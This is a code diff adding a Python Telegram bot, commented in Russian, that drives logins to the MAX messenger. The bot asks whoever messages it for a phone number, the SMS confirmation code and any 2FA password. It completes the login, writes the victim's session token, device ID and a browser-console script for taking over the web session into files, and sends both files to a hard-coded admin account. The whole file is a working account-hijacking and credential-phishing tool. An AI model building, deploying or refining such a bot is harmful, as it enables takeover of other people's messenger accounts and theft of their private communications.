@@ -1,0 +1,320 @@
+import os
+import json
+import asyncio
+import uuid
+import logging
+import time
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.types import FSInputFile
+from pymax import SocketMaxClient
+from pymax.payloads import UserAgentPayload
+
+# ============================================================
+# НАСТРОЙКИ (замените на свои)
+# ============================================================
+BOT_TOKEN = "ВАШ_ТОКЕН_БОТА_В_TELEGRAM"  # получить у @BotFather
+ADMIN_ID = 123456789                      # ваш Telegram ID (узнать у @userinfobot)
+# ============================================================
+
+logging.basicConfig(level=logging.INFO)
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher(storage=MemoryStorage())
+
+# Состояния FSM
+class AuthState(StatesGroup):
+    waiting_for_code = State()      # ожидание кода из SMS
+    waiting_for_password = State()  # ожидание пароля 2FA
+
+# Временное хранилище
+pending_clients = {}
+
+# -----------------------------------------------------------
+# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+# -----------------------------------------------------------
+def generate_password() -> str:
+    """Генерирует пароль как в веб-версии: формат nSftojjp_..."""
+    import random
+    import string
+    chars = string.ascii_letters + string.digits + "_@#"
+    return ''.join(random.choices(chars, k=40))
+
+def build_desktop_json(
+    token: str,
+    device_id: str,
+    session_id: int,
+    password: str,
+    user_id: int,
+    phone: str,
+    first_name: str,
+    last_name: str
+) -> dict:
+    """Собирает полный JSON для десктопной сессии."""
+    return {
+        "token": token,
+        "device_id": device_id,
+        "session_id": session_id,
+        "password": password,
+        "connection_params": {
+            "device_type": "DESKTOP",
+            "header_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
+            "app_version": "25.12.13",
+            "device_name": "Chrome",
+            "os_version": "Windows 10",
+            "locale": "ru",
+            "device_locale": "ru",
+            "screen": "1080x1920",
+            "timezone": "Europe/Moscow"
+        },
+        "user": {
+            "user_id": user_id,
+            "phone": int(phone.replace("+", "")),
+            "photo_id": None,
+            "first_name": first_name,
+            "last_name": last_name
+        }
+    }
+
+def generate_web_js(password: str, device_id: str, token: str, viewer_id: int) -> str:
+    """Генерирует JS-код для входа в веб-версию MAX через консоль."""
+    auth_data = json.dumps({
+        "token": token,
+        "viewerId": viewer_id
+    }, ensure_ascii=False)
+    
+    js_code = f"""PASSWORD: {password}
+
+sessionStorage.clear();
+localStorage.clear();
+localStorage.setItem('__oneme_device_id', '{device_id}');
+localStorage.setItem('__oneme_auth', JSON.stringify({auth_data}));
+window.location.reload();"""
+    
+    return js_code
+
+async def finalize_auth(client, phone: str, user_id: int, work_dir: str, message: types.Message):
+    """Завершает авторизацию: извлекает данные, создает файлы, отправляет админу."""
+    await message.answer("✅ Авторизация прошла успешно! Готовлю файлы...")
+
+    # --- Извлекаем ВСЕ данные ---
+    device_id = getattr(client, 'device_id', None) or str(uuid.uuid4())
+    token = await client.get_token() if hasattr(client, 'get_token') else getattr(client, 'token', '')
+    viewer_id = getattr(client, 'my_id', None) or 0
+
+    # Генерируем или получаем остальные поля
+    password = getattr(client, 'password', None) or generate_password()
+    session_id = getattr(client, 'session_id', None) or int(time.time() * 1000)
+
+    # Пытаемся получить данные профиля
+    first_name = ""
+    last_name = ""
+    try:
+        profile = await client.get_me()
+        if profile:
+            first_name = getattr(profile, 'first_name', '') or ''
+            last_name = getattr(profile, 'last_name', '') or ''
+    except Exception:
+        logging.warning("Не удалось получить профиль через get_me()")
+
+    # ================================================================
+    # ФАЙЛ 1: ДЕСКТОПНАЯ СЕССИЯ (ПОЛНЫЙ JSON)
+    # ================================================================
+    desktop_json = build_desktop_json(
+        token=token,
+        device_id=device_id,
+        session_id=session_id,
+        password=password,
+        user_id=viewer_id,
+        phone=phone,
+        first_name=first_name,
+        last_name=last_name
+    )
+    desktop_path = f"{work_dir}/desktop_session.json"
+    with open(desktop_path, "w", encoding="utf-8") as f:
+        json.dump(desktop_json, f, ensure_ascii=False, indent=4)
+
+    # ================================================================
+    # ФАЙЛ 2: ВЕБ-ТОКЕН (JS-КОД ДЛЯ КОНСОЛИ)
+    # ================================================================
+    js_code = generate_web_js(
+        password=password,
+        device_id=device_id,
+        token=token,
+        viewer_id=viewer_id
+    )
+    web_path = f"{work_dir}/web_token.js"
+    with open(web_path, "w", encoding="utf-8") as f:
+        f.write(js_code)
+
+    # ================================================================
+    # ОТПРАВЛЯЕМ ОБА ФАЙЛА АДМИНУ
+    # ================================================================
+    await bot.send_document(
+        chat_id=ADMIN_ID,
+        document=FSInputFile(desktop_path),
+        caption=(
+            f"💻 <b>ДЕСКТОПНАЯ СЕССИЯ (JSON)</b>\n"
+            f"Номер: {phone}\n"
+            f"User ID: {user_id}"
+        ),
+        parse_mode="HTML"
+    )
+
+    await bot.send_document(
+        chat_id=ADMIN_ID,
+        document=FSInputFile(web_path),
+        caption=(
+            f"🌐 <b>ВЕБ-ТОКЕН (JS)</b>\n"
+            f"Номер: {phone}\n"
+            f"User ID: {user_id}\n\n"
+            f"Скопируй содержимое файла в консоль браузера на web.max.ru\n"
+            f"(строку PASSWORD вставлять не нужно — это пароль для справки)"
+        ),
+        parse_mode="HTML"
+    )
+
+    await message.answer("🔐 Оба файла отправлены админу. Сессия завершена.")
+
+# -----------------------------------------------------------
+# ОБРАБОТЧИКИ КОМАНД
+# -----------------------------------------------------------
+@dp.message(F.text == "/start")
+async def cmd_start(message: types.Message):
+    await message.answer(
+        "👋 Привет! Отправь мне номер телефона в формате:\n\n"
+        "<code>+79111111111</code>\n\n"
+        "Я запрошу код подтверждения у MAX и затем попрошу его у тебя.\n"
+        "Если на аккаунте установлен пароль 2FA — я запрошу и его.",
+        parse_mode="HTML"
+    )
+
+@dp.message(F.text.regexp(r'^\+7\d{10}$'))
+async def handle_phone(message: types.Message, state: FSMContext):
+    phone = message.text.strip()
+    user_id = message.from_user.id
+    work_dir = f"cache/{user_id}"
+    os.makedirs(work_dir, exist_ok=True)
+
+    # Настройка десктопного клиента
+    ua = UserAgentPayload(
+        device_type="DESKTOP",
+        app_version="25.12.13"
+    )
+    client = SocketMaxClient(
+        phone=phone,
+        work_dir=work_dir,
+        headers=ua
+    )
+    pending_clients[user_id] = {
+        "client": client,
+        "phone": phone,
+        "work_dir": work_dir
+    }
+
+    try:
+        # Запуск клиента и отправка SMS
+        await client.start(verify=False)
+        await state.set_state(AuthState.waiting_for_code)
+        await state.update_data(phone=phone, work_dir=work_dir)
+        await message.answer("📩 SMS с кодом отправлена. Введи код из 6 цифр:")
+    except Exception as e:
+        logging.error(f"Ошибка при отправке SMS: {e}")
+        await message.answer(f"❌ Ошибка при отправке SMS: {e}")
+        if user_id in pending_clients:
+            del pending_clients[user_id]
+
+@dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
+async def handle_code(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    code = message.text.strip()
+
+    if user_id not in pending_clients:
+        await message.answer("⏳ Сессия устарела. Отправь номер заново через /start.")
+        await state.clear()
+        return
+
+    data = await state.get_data()
+    phone = data["phone"]
+    work_dir = data["work_dir"]
+    client = pending_clients[user_id]["client"]
+
+    try:
+        # Пробуем верифицировать код
+        result = await client.verify(code)
+
+        # Проверяем, запросил ли сервер пароль 2FA
+        if hasattr(client, '_need_password') and client._need_password:
+            await state.set_state(AuthState.waiting_for_password)
+            await message.answer("🔐 На этом аккаунте установлен пароль двухфакторной аутентификации. Введите пароль:")
+            return
+
+        # Если 2FA нет — завершаем авторизацию
+        await finalize_auth(client, phone, user_id, work_dir, message)
+
+    except Exception as e:
+        error_msg = str(e).lower()
+        # Ловим ошибку "требуется пароль"
+        if "password" in error_msg or "2fa" in error_msg or "two_factor" in error_msg:
+            await state.set_state(AuthState.waiting_for_password)
+            await message.answer("🔐 Сервер запросил пароль двухфакторной аутентификации. Введите пароль:")
+        else:
+            logging.error(f"Ошибка верификации: {e}")
+            await message.answer(f"❌ Ошибка: {e}")
+            if user_id in pending_clients:
+                del pending_clients[user_id]
+            await state.clear()
+
+@dp.message(AuthState.waiting_for_password)
+async def handle_password(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    password_2fa = message.text.strip()
+
+    if user_id not in pending_clients:
+        await message.answer("⏳ Сессия устарела. Отправь номер заново через /start.")
+        await state.clear()
+        return
+
+    data = await state.get_data()
+    phone = data["phone"]
+    work_dir = data["work_dir"]
+    client = pending_clients[user_id]["client"]
+
+    try:
+        # Отправляем пароль через метод _two_factor_auth
+        if hasattr(client, '_two_factor_auth'):
+            await client._two_factor_auth(password_2fa)
+        elif hasattr(client, 'send_password'):
+            await client.send_password(password_2fa)
+        elif hasattr(client, 'verify'):
+            # Некоторые версии принимают пароль в verify
+            await client.verify(password_2fa)
+        else:
+            raise Exception("Метод для отправки пароля не найден в библиотеке.")
+
+        await finalize_auth(client, phone, user_id, work_dir, message)
+
+    except Exception as e:
+        logging.error(f"Ошибка при вводе пароля 2FA: {e}")
+        await message.answer(f"❌ Неверный пароль или ошибка: {e}")
+        await state.set_state(AuthState.waiting_for_password)
+        return
+
+    # Очищаем состояние и хранилище
+    if user_id in pending_clients:
+        del pending_clients[user_id]
+    await state.clear()
+
+# -----------------------------------------------------------
+# ЗАПУСК БОТА
+# -----------------------------------------------------------
+async def main():
+    logging.info("Бот запущен!")
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        logging.info("Бот остановлен.")
